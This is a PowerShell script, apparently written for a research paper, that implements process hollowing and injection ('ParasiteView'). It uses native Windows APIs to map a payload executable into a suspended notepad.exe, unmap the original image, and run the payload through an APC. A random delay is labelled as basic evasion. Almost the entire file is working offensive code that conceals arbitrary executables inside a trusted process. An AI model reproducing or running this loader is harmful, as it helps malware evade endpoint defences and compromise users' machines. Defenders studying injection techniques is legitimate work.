# 1. PRIMERO: Definir todas las estructuras y APIs CORRECTAMENTE
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

// CONTEXT64 correcto para x64 (basado en winnt.h)
[StructLayout(LayoutKind.Sequential)]
public struct CONTEXT64 {
    public ulong P1Home;
    public ulong P2Home;
    public ulong P3Home;
    public ulong P4Home;
    public ulong P5Home;
    public ulong P6Home;
    
    public uint ContextFlags;
    public uint MxCsr;
    
    public ushort SegCs;
    public ushort SegDs;
    public ushort SegEs;
    public ushort SegFs;
    public ushort SegGs;
    public ushort SegSs;
    public uint EFlags;
    
    public ulong Dr0;
    public ulong Dr1;
    public ulong Dr2;
    public ulong Dr3;
    public ulong Dr6;
    public ulong Dr7;
    
    public ulong Rax;
    public ulong Rcx;
    public ulong Rdx;
    public ulong Rbx;
    public ulong Rsp;
    public ulong Rbp;
    public ulong Rsi;
    public ulong Rdi;
    public ulong R8;
    public ulong R9;
    public ulong R10;
    public ulong R11;
    public ulong R12;
    public ulong R13;
    public ulong R14;
    public ulong R15;
    public ulong Rip;
    
    // XSAVE_FORMAT (XMM_SAVE_AREA32) = 512 bytes
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
    public byte[] FltSave;

    // M128A VectorRegister[26] = 26 * 16 = 416 bytes
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 416)]
    public byte[] VectorRegister;

    public ulong VectorControl;
    public ulong DebugControl;
    public ulong LastBranchToRip;
    public ulong LastBranchFromRip;
    public ulong LastExceptionToRip;
    public ulong LastExceptionFromRip;
}

// ARM64 CONTEXT for Windows on ARM (based on winnt.h ARM64_NT_CONTEXT)
[StructLayout(LayoutKind.Sequential)]
public struct CONTEXT_ARM64 {
    public uint ContextFlags;
    public uint Cpsr;

    // General purpose registers X0-X28, Fp (X29), Lr (X30)
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 31)]
    public ulong[] X;

    public ulong Sp;
    public ulong Pc;

    // NEON/FP registers V[32], each 128-bit = 32 * 16 = 512 bytes
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
    public byte[] V;

    public uint Fpcr;
    public uint Fpsr;

    // Debug registers
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
    public uint[] Bcr;   // ARM64_MAX_BREAKPOINTS = 8
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
    public ulong[] Bvr;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
    public uint[] Wcr;   // ARM64_MAX_WATCHPOINTS = 2
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
    public ulong[] Wvr;
}

[StructLayout(LayoutKind.Sequential)]
public struct UNICODE_STRING {
    public ushort Length;
    public ushort MaximumLength;
    public IntPtr Buffer;
}

[StructLayout(LayoutKind.Sequential)]
public struct OBJECT_ATTRIBUTES {
    public uint Length;  // ULONG en lugar de int
    public IntPtr RootDirectory;
    public IntPtr ObjectName;
    public uint Attributes;
    public IntPtr SecurityDescriptor;
    public IntPtr SecurityQualityOfService;
}

// PROCESS_BASIC_INFORMATION CORRECTA (basada en ntddk.h)
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_BASIC_INFORMATION {
    public IntPtr ExitStatus;
    public IntPtr PebBaseAddress;
    public IntPtr AffinityMask;
    public int BasePriority;
    public IntPtr UniqueProcessId;
    public IntPtr InheritedFromUniqueProcessId;
}

public static class NtNative {
    // Architecture constants
    public const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664;
    public const ushort IMAGE_FILE_MACHINE_ARM64 = 0xAA64;

    // Context flags
    public const uint CONTEXT_AMD64_INTEGER = 0x100002;
    public const uint CONTEXT_ARM64_INTEGER = 0x00400002;

    // Constantes
    public const uint PAGE_READWRITE = 0x04;
    public const uint PAGE_EXECUTE_READ = 0x20;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint SECTION_ALL_ACCESS = 0xF001F;
    public const uint SECTION_MAP_EXECUTE = 0x08;
    public const uint SEC_COMMIT = 0x08000000;
    public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
    public const uint VIEW_UNMAP = 2;
    
    // Para NtQueryInformationProcess
    public const uint ProcessBasicInformation = 0;
    
    [DllImport("ntdll.dll")]
    public static extern uint NtCreateSection(
        out IntPtr SectionHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        ref long MaximumSize,  // PLARGE_INTEGER
        uint SectionPageProtection,
        uint AllocationAttributes,
        IntPtr FileHandle
    );
    
    [DllImport("ntdll.dll")]
    public static extern uint NtMapViewOfSection(
        IntPtr SectionHandle,
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        IntPtr CommitSize,
        ref long SectionOffset,  // PLARGE_INTEGER
        ref ulong ViewSize,      // PSIZE_T (ulong)
        uint InheritDisposition,
        uint AllocationType,
        uint Win32Protect
    );
    
    [DllImport("ntdll.dll")]
    public static extern uint NtUnmapViewOfSection(
        IntPtr ProcessHandle,
        IntPtr BaseAddress
    );
    
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessW(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFOEXW si,
        out PROCESS_INFORMATION pi
    );
    
    [DllImport("ntdll.dll")]
    public static extern uint NtQueueApcThread(
        IntPtr ThreadHandle,
        IntPtr ApcRoutine,
        IntPtr ApcArgument1,
        IntPtr ApcArgument2,
        IntPtr ApcArgument3
    );
    
    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);
    
    [DllImport("kernel32.dll", SetLastError=true, EntryPoint="GetThreadContext")]
    public static extern bool GetThreadContext64(
        IntPtr hThread,
        ref CONTEXT64 lpContext
    );

    [DllImport("kernel32.dll", SetLastError=true, EntryPoint="GetThreadContext")]
    public static extern bool GetThreadContextArm64(
        IntPtr hThread,
        ref CONTEXT_ARM64 lpContext
    );
    
    [DllImport("ntdll.dll")]
    public static extern uint NtQueryInformationProcess(
        IntPtr ProcessHandle,
        uint ProcessInformationClass,
        out PROCESS_BASIC_INFORMATION ProcessInformation,
        uint ProcessInformationLength,
        out uint ReturnLength
    );
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead
    );
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out IntPtr lpNumberOfBytesWritten
    );
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint GetLastError();
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFOEXW {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
        public IntPtr lpAttributeList;
    }
}
"@

# 2. SEGUNDO: Definir funciones de ayuda
function New-UnicodeString {
    param([string]$String)
    
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($String)
    $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length + 2)
    [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $buffer, $bytes.Length)
    [System.Runtime.InteropServices.Marshal]::WriteInt16($buffer, $bytes.Length, 0)  # Null terminator
    
    $unicodeString = New-Object UNICODE_STRING
    $unicodeString.Length = $bytes.Length
    $unicodeString.MaximumLength = $bytes.Length + 2
    $unicodeString.Buffer = $buffer
    
    return $unicodeString
}

function New-ObjectAttributes {
    param(
        [UNICODE_STRING]$ObjectName,
        [uint]$Attributes = 0
    )
    
    $oa = New-Object OBJECT_ATTRIBUTES
    $oa.Length = [uint][System.Runtime.InteropServices.Marshal]::SizeOf($oa)
    $oa.RootDirectory = [IntPtr]::Zero
    $oa.ObjectName = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($ObjectName))
    [System.Runtime.InteropServices.Marshal]::StructureToPtr($ObjectName, $oa.ObjectName, $false)
    $oa.Attributes = $Attributes
    $oa.SecurityDescriptor = [IntPtr]::Zero
    $oa.SecurityQualityOfService = [IntPtr]::Zero
    
    return $oa
}

function Get-RemoteImageBase {
    param(
        [IntPtr]$hProcess,
        [IntPtr]$hThread
    )
    
    try {
        # Intentar obtener del PEB (método robusto)
        $pbi = New-Object PROCESS_BASIC_INFORMATION
        $returnLength = 0
        
        $status = [NtNative]::NtQueryInformationProcess(
            $hProcess, 
            [NtNative]::ProcessBasicInformation, 
            [ref]$pbi, 
            [System.Runtime.InteropServices.Marshal]::SizeOf($pbi), 
            [ref]$returnLength
        )
        
        if ($status -eq 0 -and $pbi.PebBaseAddress -ne [IntPtr]::Zero) {
            # PEB offset 0x10 = ImageBaseAddress (same on x64 and ARM64, both 64-bit)
            $buffer = New-Object byte[] 8
            $bytesRead = [IntPtr]::Zero
            
            $imageBasePtr = [IntPtr]::Add($pbi.PebBaseAddress, 0x10)
            
            if ([NtNative]::ReadProcessMemory($hProcess, $imageBasePtr, $buffer, 8, [ref]$bytesRead)) {
                $imageBase = [BitConverter]::ToInt64($buffer, 0)
                if ($imageBase -ne 0) {
                    Write-Host "[*] ImageBase obtained from PEB: 0x$("{0:X}" -f $imageBase)"
                    return [IntPtr]::new($imageBase)
                }
            }
        }
        
        Write-Host "[!] PEB method failed, using context fallback"
    }
    catch {
        Write-Host "[!] Exception in PEB method: $_"
    }
    
    # Fallback: usar contexto (architecture-aware)
    Write-Host "[!] Using context fallback for ImageBase"

    if ($script:isArm64) {
        $ctx = New-Object CONTEXT_ARM64
        $ctx.X = New-Object ulong[] 31
        $ctx.V = New-Object byte[] 512
        $ctx.Bcr = New-Object uint[] 8
        $ctx.Bvr = New-Object ulong[] 8
        $ctx.Wcr = New-Object uint[] 2
        $ctx.Wvr = New-Object ulong[] 2
        $ctx.ContextFlags = [NtNative]::CONTEXT_ARM64_INTEGER

        if (-not [NtNative]::GetThreadContextArm64($hThread, [ref]$ctx)) {
            $lastError = [NtNative]::GetLastError()
            throw "GetThreadContext (ARM64) failed: 0x$("{0:X}" -f $lastError)"
        }

        # On ARM64, X1 holds the PEB pointer for the initial thread (analogous to Rdx on x64)
        Write-Host "[*] ImageBase from context.X[1]: 0x$("{0:X}" -f $ctx.X[1])"
        return [IntPtr]::new([Int64]$ctx.X[1])
    }
    else {
        $ctx = New-Object CONTEXT64
        $ctx.FltSave = New-Object byte[] 512
        $ctx.VectorRegister = New-Object byte[] 416
        $ctx.ContextFlags = [NtNative]::CONTEXT_AMD64_INTEGER

        if (-not [NtNative]::GetThreadContext64($hThread, [ref]$ctx)) {
            $lastError = [NtNative]::GetLastError()
            throw "GetThreadContext (x64) failed: 0x$("{0:X}" -f $lastError)"
        }

        Write-Host "[*] ImageBase from context.Rdx: 0x$("{0:X}" -f $ctx.Rdx)"
        return [IntPtr]::new([Int64]$ctx.Rdx)
    }
}

# 3. TERCERO: Código principal
# Detect host architecture
$script:isArm64 = [System.Runtime.InteropServices.RuntimeInformation]::ProcessArchitecture -eq [System.Runtime.InteropServices.Architecture]::Arm64
if ($script:isArm64) {
    Write-Host "[*] Host architecture: ARM64"
    $expectedMachine = [NtNative]::IMAGE_FILE_MACHINE_ARM64
} else {
    Write-Host "[*] Host architecture: x64 (AMD64)"
    $expectedMachine = [NtNative]::IMAGE_FILE_MACHINE_AMD64
}

# CONFIG
$payloadPath = "payload.exe"
$targetBinary = "C:\Windows\System32\notepad.exe"
$secSize = [long]0x200000

# VALIDATE PAYLOAD
if (-not (Test-Path $payloadPath)) { 
    throw "Payload not found: $payloadPath" 
}

$payload = [IO.File]::ReadAllBytes($payloadPath)
if ($payload.Length -gt $secSize) { 
    throw "Payload too large. Max allowed: $secSize bytes" 
}

# Parse PE headers
try {
    $e_lfanew = [BitConverter]::ToInt32($payload, 0x3C)
    if ($e_lfanew -lt 64 -or $e_lfanew -ge $payload.Length - 256) {
        throw "Invalid e_lfanew value"
    }
    
    # Validate Machine type from COFF header (offset +4 from PE signature)
    $machineType = [BitConverter]::ToUInt16($payload, $e_lfanew + 4)
    if ($machineType -ne $expectedMachine) {
        $machineHex = "0x{0:X4}" -f $machineType
        $expectedHex = "0x{0:X4}" -f $expectedMachine
        throw "Payload Machine type mismatch: got $machineHex, expected $expectedHex for current architecture"
    }
    Write-Host "[*] PE Machine type: 0x$("{0:X4}" -f $machineType)"

    $optionalHeaderOffset = $e_lfanew + 0x18
    $is64Bit = [BitConverter]::ToUInt16($payload, $optionalHeaderOffset + 0x0) -eq 0x20B

    if (-not $is64Bit) {
        throw "Only 64-bit (PE32+) payloads are supported"
    }

    $imageBase = [BitConverter]::ToUInt64($payload, $optionalHeaderOffset + 0x18)
    $entryPointRVA = [BitConverter]::ToUInt32($payload, $optionalHeaderOffset + 0x10)
    
    Write-Host "[*] Payload ImageBase: 0x$("{0:X}" -f $imageBase)"
    Write-Host "[*] EntryPoint RVA: 0x$("{0:X}" -f $entryPointRVA)"
    Write-Host "[*] Payload size: $($payload.Length) bytes"
    Write-Host "[!] NOTE: This technique assumes the payload is position-independent or compiled with /FIXED"
}
catch {
    throw "Invalid PE file: $_"
}

# 1. Create named section
$sectionName = "\BaseNamedObjects\Windows_SharedMemory_" + (Get-Random -Minimum 1000 -Maximum 9999)
Write-Host "[*] Creating section: $sectionName"

$unicodeString = New-UnicodeString -String $sectionName
$objectAttributes = New-ObjectAttributes -ObjectName $unicodeString -Attributes [NtNative]::OBJ_CASE_INSENSITIVE

$hSection = [IntPtr]::Zero
$status = [NtNative]::NtCreateSection(
    [ref]$hSection,
    [NtNative]::SECTION_ALL_ACCESS,
    [ref]$objectAttributes,
    [ref]$secSize,
    [NtNative]::PAGE_EXECUTE_READWRITE,
    [NtNative]::SEC_COMMIT,
    [IntPtr]::Zero
)

if ($status -ne 0) { 
    throw "NtCreateSection failed: 0x$("{0:X}" -f $status)" 
}
Write-Host "[+] Section created successfully"

# 2. Map into local process
$localBase = [IntPtr]::Zero
$viewSize = [ulong]$secSize
$sectionOffset = [long]0

$status = [NtNative]::NtMapViewOfSection(
    $hSection,
    (Get-Process -id $PID).Handle,
    [ref]$localBase,
    [IntPtr]::Zero,
    [IntPtr]::Zero,
    [ref]$sectionOffset,
    [ref]$viewSize,
    [NtNative]::VIEW_UNMAP,
    0,
    [NtNative]::PAGE_EXECUTE_READWRITE
)

if ($status -ne 0) { 
    throw "NtMapView (self) failed: 0x$("{0:X}" -f $status)" 
}

# Copiar payload
[System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $localBase, $payload.Length)
Write-Host "[+] Payload mapped locally at: 0x$("{0:X}" -f $localBase.ToInt64())"

# 3. Launch target suspended
$si = New-Object NtNative+STARTUPINFOEXW
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = New-Object NtNative+PROCESS_INFORMATION

Write-Host "[*] Creating suspended process: $targetBinary"
if (-not [NtNative]::CreateProcessW(
    $targetBinary,
    $null,
    [IntPtr]::Zero,
    [IntPtr]::Zero,
    $false,
    0x4,  # CREATE_SUSPENDED
    [IntPtr]::Zero,
    $null,
    [ref]$si,
    [ref]$pi
)) {
    $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    throw "CreateProcess failed: 0x$("{0:X}" -f $lastError)"
}
Write-Host "[+] Process created (PID: $($pi.dwProcessId))"

# 4. Get ImageBase from PEB (método robusto)
$remoteImageBase = Get-RemoteImageBase -hProcess $pi.hProcess -hThread $pi.hThread
Write-Host "[*] Remote ImageBase: 0x$("{0:X}" -f $remoteImageBase.ToInt64())"

# 5. Unmap original image
Write-Host "[*] Unmapping original image..."
$status = [NtNative]::NtUnmapViewOfSection($pi.hProcess, $remoteImageBase)
if ($status -ne 0) { 
    Write-Host "[!] NtUnmapViewOfSection returned 0x$("{0:X}" -f $status) (non-critical)"
}

# 6. Random delay (3-10s) - Evasión básica
$delay = Get-Random -Minimum 3000 -Maximum 10000
Write-Host "[*] Random delay: $($delay/1000) seconds"
Start-Sleep -Milliseconds $delay

# 7. Map into remote process
Write-Host "[*] Mapping section into remote process..."
$remoteBase = $remoteImageBase
$viewSize = [ulong]$secSize

$status = [NtNative]::NtMapViewOfSection(
    $hSection,
    $pi.hProcess,
    [ref]$remoteBase,
    [IntPtr]::Zero,
    [IntPtr]::Zero,
    [ref]$sectionOffset,
    [ref]$viewSize,
    [NtNative]::VIEW_UNMAP,
    0,
    [NtNative]::PAGE_EXECUTE_READWRITE
)

if ($status -ne 0) { 
    throw "NtMapView (remote) failed: 0x$("{0:X}" -f $status)" 
}
Write-Host "[+] Remote mapping successful at: 0x$("{0:X}" -f $remoteBase.ToInt64())"

# 8. Queue APC to payload entrypoint
$apcRoutine = [IntPtr]::Add($remoteBase, $entryPointRVA)
Write-Host "[*] Queueing APC to: 0x$("{0:X}" -f $apcRoutine.ToInt64())"
Write-Host "[!] WARNING: Jumping to EntryPoint assumes payload is position-independent or properly relocated"

$status = [NtNative]::NtQueueApcThread($pi.hThread, $apcRoutine, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
if ($status -ne 0) { 
    throw "NtQueueApcThread failed: 0x$("{0:X}" -f $status)" 
}

# 9. Resume thread
Write-Host "[*] Resuming thread..."
[NtNative]::ResumeThread($pi.hThread) | Out-Null
Write-Host "[+] ParasiteView: Payload executed via APC in process $($pi.dwProcessId)"

# 10. Cleanup
Write-Host "[*] Cleaning up..."
try {
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($unicodeString.Buffer)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($objectAttributes.ObjectName)
}
catch {
    Write-Host "[!] Cleanup error: $_"
}

Write-Host "[!] Done! Check your payload execution."
Write-Host ""
Write-Host "=== FOR PAPER DISCUSSION ==="
Write-Host "1. CONTEXT64 and CONTEXT_ARM64 structures with correct ABI layout"
Write-Host "2. Runtime architecture detection (x64/ARM64) with matching PE Machine validation"
Write-Host "3. OBJECT_ATTRIBUTES with correct ULONG Length"
Write-Host "4. PROCESS_BASIC_INFORMATION correct for ProcessBasicInformation"
Write-Host "5. Section created with proper UNICODE_STRING"
Write-Host "6. ImageBase obtained via PEB (robust) with arch-aware context fallback"
Write-Host "7. Limitation: EntryPoint jump assumes position-independent payload"
Write-Host "   (For production: implement PE loader or use shellcode stub)"